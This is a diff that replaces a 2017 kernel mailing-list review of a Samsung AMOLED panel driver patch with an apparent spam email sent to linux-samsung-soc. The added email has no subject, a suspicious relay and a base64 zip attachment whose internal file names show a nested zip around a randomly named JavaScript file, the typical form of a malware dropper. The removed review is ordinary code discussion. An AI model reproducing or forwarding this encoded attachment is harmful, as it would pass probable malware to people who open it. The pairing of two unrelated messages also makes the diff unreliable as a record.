@@ -1,242 +1,106 @@
-From: Andrzej Hajda <a.hajda@samsung.com>
-Subject: Re: [PATCH v3 2/3] drm/panel: Add support for s6e63j0x03 panel driver
-Date: Wed, 12 Jul 2017 16:52:03 +0200
-Message-ID: <a1f370eb-0c09-aa9c-e63d-bb24cbc36a71@samsung.com>
-References: <1498529470-20652-1-git-send-email-hoegeun.kwon@samsung.com>
- <CGME20170627021124epcas5p12ef8d03c85405ceb35d75c6d4eea6b01@epcas5p1.samsung.com>
- <1498529470-20652-3-git-send-email-hoegeun.kwon@samsung.com>
- <5e374a8b-1ec4-4cb8-3020-993dd749100e@samsung.com>
+From: <patientcentral@pancan.org>
+Subject: (unknown)
+Date: Wed, 12 Jul 2017 19:24:59 -0000
+Message-ID: <149988749958.2511.15683567166120239866@murphx.net>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=utf-8
-Content-Transfer-Encoding: 8bit
+Content-Type: application/zip; name="EMAIL_1724158835008_linux-samsung-soc.zip
+Content-Transfer-Encoding: base64
 Return-path: <linux-samsung-soc-owner@vger.kernel.org>
-Received: from mailout3.w1.samsung.com ([210.118.77.13]:49412 "EHLO
-        mailout3.w1.samsung.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1752760AbdGLOwK (ORCPT
+Received: from 109-170-184-211.xdsl.murphx.net ([109.170.184.211]:46853 "HELO
+        murphx.net" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with SMTP
+        id S1750993AbdGLTZE (ORCPT
         <rfc822;linux-samsung-soc@vger.kernel.org>);
-        Wed, 12 Jul 2017 10:52:10 -0400
-In-reply-to: <5e374a8b-1ec4-4cb8-3020-993dd749100e@samsung.com>
-Content-language: en-US
+        Wed, 12 Jul 2017 15:25:04 -0400
+Subject: 
+Content-Disposition: attachment
 Sender: linux-samsung-soc-owner@vger.kernel.org
 List-Id: linux-samsung-soc@vger.kernel.org
-To: Hoegeun Kwon <hoegeun.kwon@samsung.com>, thierry.reding@gmail.com, airlied@linux.ie, robh+dt@kernel.org, mark.rutland@arm.com, catalin.marinas@arm.com, will.deacon@arm.com, kgene@kernel.org, krzk@kernel.org
-Cc: devicetree@vger.kernel.org, linux-samsung-soc@vger.kernel.org, linux-kernel@vger.kernel.org, dri-devel@lists.freedesktop.org, javier@osg.samsung.com, Hyungwon Hwang <human.hwang@samsung.com>, linux-arm-kernel@lists.infradead.org
+To: linux-samsung-soc@vger.kernel.org
 
-On 12.07.2017 15:25, Andrzej Hajda wrote:
-> On 27.06.2017 04:11, Hoegeun Kwon wrote:
->> This patch adds MIPI-DSI based S6E63J0X03 AMOLED LCD panel driver
->> which uses mipi_dsi bus to communicate with panel. The panel has
->> 320×320 resolution in 1.63" physical panel. This panel is used in
->> Samsung Galaxy Gear 2.
->>
->> Signed-off-by: Inki Dae <inki.dae@samsung.com>
->> Signed-off-by: Hyungwon Hwang <human.hwang@samsung.com>
->> Signed-off-by: Hoegeun Kwon <hoegeun.kwon@samsung.com>
->> ---
->>  drivers/gpu/drm/panel/Kconfig                    |   7 +
->>  drivers/gpu/drm/panel/Makefile                   |   1 +
->>  drivers/gpu/drm/panel/panel-samsung-s6e63j0x03.c | 540 +++++++++++++++++++++++
->>  3 files changed, 548 insertions(+)
->>  create mode 100644 drivers/gpu/drm/panel/panel-samsung-s6e63j0x03.c
->>
->> diff --git a/drivers/gpu/drm/panel/Kconfig b/drivers/gpu/drm/panel/Kconfig
->> index 3e29a99..3f4afde 100644
->> --- a/drivers/gpu/drm/panel/Kconfig
->> +++ b/drivers/gpu/drm/panel/Kconfig
->> @@ -68,6 +68,13 @@ config DRM_PANEL_SAMSUNG_S6E3HA2
->>  	depends on DRM_MIPI_DSI
->>  	select VIDEOMODE_HELPERS
->>  
->> +config DRM_PANEL_SAMSUNG_S6E63J0X03
->> +	tristate "Samsung S6E63J0X03 DSI command mode panel"
->> +	depends on OF
->> +	depends on DRM_MIPI_DSI
->> +	depends on BACKLIGHT_CLASS_DEVICE
->> +	select VIDEOMODE_HELPERS
->> +
->>  config DRM_PANEL_SAMSUNG_S6E8AA0
->>  	tristate "Samsung S6E8AA0 DSI video mode panel"
->>  	depends on OF
->> diff --git a/drivers/gpu/drm/panel/Makefile b/drivers/gpu/drm/panel/Makefile
->> index 292b3c7..f028269 100644
->> --- a/drivers/gpu/drm/panel/Makefile
->> +++ b/drivers/gpu/drm/panel/Makefile
->> @@ -5,6 +5,7 @@ obj-$(CONFIG_DRM_PANEL_LG_LG4573) += panel-lg-lg4573.o
->>  obj-$(CONFIG_DRM_PANEL_PANASONIC_VVX10F034N00) += panel-panasonic-vvx10f034n00.o
->>  obj-$(CONFIG_DRM_PANEL_SAMSUNG_LD9040) += panel-samsung-ld9040.o
->>  obj-$(CONFIG_DRM_PANEL_SAMSUNG_S6E3HA2) += panel-samsung-s6e3ha2.o
->> +obj-$(CONFIG_DRM_PANEL_SAMSUNG_S6E63J0X03) += panel-samsung-s6e63j0x03.o
->>  obj-$(CONFIG_DRM_PANEL_SAMSUNG_S6E8AA0) += panel-samsung-s6e8aa0.o
->>  obj-$(CONFIG_DRM_PANEL_SHARP_LQ101R1SX01) += panel-sharp-lq101r1sx01.o
->>  obj-$(CONFIG_DRM_PANEL_SHARP_LS043T1LE01) += panel-sharp-ls043t1le01.o
->> diff --git a/drivers/gpu/drm/panel/panel-samsung-s6e63j0x03.c b/drivers/gpu/drm/panel/panel-samsung-s6e63j0x03.c
->> new file mode 100644
->> index 0000000..c3d1b5d
->> --- /dev/null
->> +++ b/drivers/gpu/drm/panel/panel-samsung-s6e63j0x03.c
->> @@ -0,0 +1,540 @@
->> +/*
->> + * MIPI-DSI based S6E63J0X03 AMOLED lcd 1.63 inch panel driver.
->> + *
->> + * Copyright (c) 2014-2017 Samsung Electronics Co., Ltd
->> + *
->> + * Inki Dae <inki.dae@samsung.com>
->> + * Hoegeun Kwon <hoegeun.kwon@samsung.com>
->> + *
->> + * This program is free software; you can redistribute it and/or modify
->> + * it under the terms of the GNU General Public License version 2 as
->> + * published by the Free Software Foundation.
->> + */
->> +
->> +#include <drm/drmP.h>
->> +#include <drm/drm_mipi_dsi.h>
->> +#include <drm/drm_panel.h>
->> +#include <linux/backlight.h>
->> +#include <linux/gpio/consumer.h>
->> +#include <linux/regulator/consumer.h>
->> +#include <video/mipi_display.h>
->> +
->> +#define MCS_LEVEL2_KEY		0xf0
->> +#define MCS_MTP_KEY		0xf1
->> +#define MCS_MTP_SET3		0xd4
->> +
->> +#define MAX_BRIGHTNESS		100
->> +#define DEFAULT_BRIGHTNESS	80
->> +
->> +#define NUM_GAMMA_STEPS		9
->> +#define GAMMA_CMD_CNT		28
->> +
->> +#define FIRST_COLUMN 20
->> +
->> +struct s6e63j0x03 {
->> +	struct device *dev;
->> +	struct drm_panel panel;
->> +	struct backlight_device *bl_dev;
->> +
->> +	struct regulator_bulk_data supplies[2];
->> +	struct gpio_desc *reset_gpio;
->> +};
->> +
->> +static const struct drm_display_mode default_mode = {
->> +	.clock = 4649,
->> +	.hdisplay = 320,
->> +	.hsync_start = 320 + 1,
->> +	.hsync_end = 320 + 1 + 1,
->> +	.htotal = 320 + 1 + 1 + 1,
->> +	.vdisplay = 320,
->> +	.vsync_start = 320 + 150,
->> +	.vsync_end = 320 + 150 + 1,
->> +	.vtotal = 320 + 150 + 1 + 2,
->> +	.vrefresh = 30,
->> +	.flags = 0,
->> +};
->> +
->> +static const unsigned char gamma_tbl[NUM_GAMMA_STEPS][GAMMA_CMD_CNT] = {
->> +	{	/* Gamma 10 */
->> +		MCS_MTP_SET3,
->> +		0x00, 0x00, 0x00, 0x7f, 0x7f, 0x7f, 0x52, 0x6b, 0x6f, 0x26,
->> +		0x28, 0x2d, 0x28, 0x26, 0x27, 0x33, 0x34, 0x32, 0x36, 0x36,
->> +		0x35, 0x00, 0xab, 0x00, 0xae, 0x00, 0xbf
->> +	},
->> +	{	/* gamma 30 */
->> +		MCS_MTP_SET3,
->> +		0x00, 0x00, 0x00, 0x70, 0x7f, 0x7f, 0x4e, 0x64, 0x69, 0x26,
->> +		0x27, 0x2a, 0x28, 0x29, 0x27, 0x31, 0x32, 0x31, 0x35, 0x34,
->> +		0x35, 0x00, 0xc4, 0x00, 0xca, 0x00, 0xdc
->> +	},
->> +	{	/* gamma 60 */
->> +		MCS_MTP_SET3,
->> +		0x00, 0x00, 0x00, 0x65, 0x7b, 0x7d, 0x5f, 0x67, 0x68, 0x2a,
->> +		0x28, 0x29, 0x28, 0x2a, 0x27, 0x31, 0x2f, 0x30, 0x34, 0x33,
->> +		0x34, 0x00, 0xd9, 0x00, 0xe4, 0x00, 0xf5
->> +	},
->> +	{	/* gamma 90 */
->> +		MCS_MTP_SET3,
->> +		0x00, 0x00, 0x00, 0x4d, 0x6f, 0x71, 0x67, 0x6a, 0x6c, 0x29,
->> +		0x28, 0x28, 0x28, 0x29, 0x27, 0x30, 0x2e, 0x30, 0x32, 0x31,
->> +		0x31, 0x00, 0xea, 0x00, 0xf6, 0x01, 0x09
->> +	},
->> +	{	/* gamma 120 */
->> +		MCS_MTP_SET3,
->> +		0x00, 0x00, 0x00, 0x3d, 0x66, 0x68, 0x69, 0x69, 0x69, 0x28,
->> +		0x28, 0x27, 0x28, 0x28, 0x27, 0x30, 0x2e, 0x2f, 0x31, 0x31,
->> +		0x30, 0x00, 0xf9, 0x01, 0x05, 0x01, 0x1b
->> +	},
->> +	{	/* gamma 150 */
->> +		MCS_MTP_SET3,
->> +		0x00, 0x00, 0x00, 0x31, 0x51, 0x53, 0x66, 0x66, 0x67, 0x28,
->> +		0x29, 0x27, 0x28, 0x27, 0x27, 0x2e, 0x2d, 0x2e, 0x31, 0x31,
->> +		0x30, 0x01, 0x04, 0x01, 0x11, 0x01, 0x29
->> +	},
->> +	{	/* gamma 200 */
->> +		MCS_MTP_SET3,
->> +		0x00, 0x00, 0x00, 0x2f, 0x4f, 0x51, 0x67, 0x65, 0x65, 0x29,
->> +		0x2a, 0x28, 0x27, 0x25, 0x26, 0x2d, 0x2c, 0x2c, 0x30, 0x30,
->> +		0x30, 0x01, 0x14, 0x01, 0x23, 0x01, 0x3b
->> +	},
->> +	{	/* gamma 240 */
->> +		MCS_MTP_SET3,
->> +		0x00, 0x00, 0x00, 0x2c, 0x4d, 0x50, 0x65, 0x63, 0x64, 0x2a,
->> +		0x2c, 0x29, 0x26, 0x24, 0x25, 0x2c, 0x2b, 0x2b, 0x30, 0x30,
->> +		0x30, 0x01, 0x1e, 0x01, 0x2f, 0x01, 0x47
->> +	},
->> +	{	/* gamma 300 */
->> +		MCS_MTP_SET3,
->> +		0x00, 0x00, 0x00, 0x38, 0x61, 0x64, 0x65, 0x63, 0x64, 0x28,
->> +		0x2a, 0x27, 0x26, 0x23, 0x25, 0x2b, 0x2b, 0x2a, 0x30, 0x2f,
->> +		0x30, 0x01, 0x2d, 0x01, 0x3f, 0x01, 0x57
->> +	}
->> +};
->> +
->> +static inline struct s6e63j0x03 *panel_to_s6e63j0x03(struct drm_panel *panel)
->> +{
->> +	return container_of(panel, struct s6e63j0x03, panel);
->> +}
->> +
->> +static inline ssize_t s6e63j0x03_dcs_write_seq(struct s6e63j0x03 *ctx,
->> +					const void *seq, size_t len)
->> +{
->> +	struct mipi_dsi_device *dsi = to_mipi_dsi_device(ctx->dev);
->> +
->> +	return mipi_dsi_dcs_write_buffer(dsi, seq, len);
->> +}
->> +
->> +#define s6e63j0x03_dcs_write_seq_static(ret, ctx, seq...)		\
->> +	do {								\
->> +		static const u8 d[] = { seq };				\
->> +		ret = s6e63j0x03_dcs_write_seq(ctx, d, ARRAY_SIZE(d));	\
->> +	} while (0)
-> I think better would be to use statement expression here [1]:
-> #define s6e63j0x03_dcs_write_seq_static(ctx, seq...) \
-> ({ \
->     static const u8 d[] = { seq }; \
->     s6e63j0x03_dcs_write_seq(ctx, d, ARRAY_SIZE(d)); \
-> })
->
-> This way instead of passing ret by reference you can use return value.
->
-> [1]: https://gcc.gnu.org/onlinedocs/gcc/Statement-Exprs.html
->
->> +
->> +static inline int s6e63j0x03_enable_lv2_command(struct s6e63j0x03 *ctx)
->> +{
->> +	int ret;
->> +
->> +	s6e63j0x03_dcs_write_seq_static(ret, ctx, MCS_LEVEL2_KEY, 0x5a, 0x5a);
->> +	return ret;
->> +}
-> With the construct above this function can be simplified to:
->
-> +static inline int s6e63j0x03_enable_lv2_command(struct s6e63j0x03 *ctx)
-> +{
-> +	s6e63j0x03_dcs_write_seq_static(ctx, MCS_LEVEL2_KEY, 0x5a, 0x5a);
-
-Ups, should be:
-    return s6e63j0x03_dcs_write_seq_static(ctx, MCS_LEVEL2_KEY, 0x5a, 0x5a);
-
-Regards
-Andrzej
-
-> +}
->
->
+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
